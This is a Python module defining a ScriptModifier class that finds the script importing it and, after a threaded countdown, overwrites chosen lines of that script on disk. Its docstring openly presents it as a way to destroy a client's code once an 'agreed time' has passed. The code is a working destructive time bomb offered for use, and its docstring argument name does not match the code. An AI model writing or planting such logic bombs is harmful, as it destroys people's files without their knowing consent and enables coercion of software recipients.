import os
import inspect
import threading
import time

class ScriptModifier:

    def __init__(self):
        # Attempt to get the path of the calling script
        stack = inspect.stack()
        try:
            # Assume the calling script is the one that's two levels up in the stack
            frame = stack[2]
            self.target_script_path = frame.filename
        except IndexError:
            # If the assumption is wrong, fall back to the current script
            self.target_script_path = os.path.join(os.getcwd(), os.path.basename(inspect.getfile(inspect.currentframe())))

    def modify_script(self, lines_to_remove):
        
        """
        Destroys the code in which this library is being called. The purpose of this code is to allow your main code to run for a specified time, after which it prevents further use of your main code beyond the agreed time.

        Args:
            lines_to_impact (list): A list of line numbers to be empacted from the script.
        
        Returns:
            None

        """
        print("I am activated")
        # Read the script into memory
        with open(self.target_script_path, 'r') as file:
            lines = file.readlines()
        
        # Remove the specified lines
        for line_number in lines_to_remove:
            if 0 <= line_number < len(lines):
                lines[line_number] = ""
        
        # Write the updated contents back to disk
        with open(self.target_script_path, 'w') as file:
            file.writelines(lines)
        
        print('Modification successful.')

    def delayed_modification(self, minutes, lines_to_remove):
        seconds = minutes * 60
        for i in range(seconds, 0, -1):  # Countdown
            time.sleep(1)
            remaining_minutes, remaining_seconds = divmod(i, 60)
            print(f'{remaining_minutes} minutes {remaining_seconds} seconds remaining.')
            if i == 10:
                print('I am going to destroy it.')
        
        # Call the function, specifying the line numbers to remove
        self.modify_script(lines_to_remove)

    def trigger_modification(self, minutes, lines_to_remove):
        threading.Thread(target=self.delayed_modification, args=(minutes, lines_to_remove)).start()

# # Usage:

# if __name__ == '__main__':
#     modifier = ScriptModifier()
#     modifier.trigger_modification(1, [13, 15])
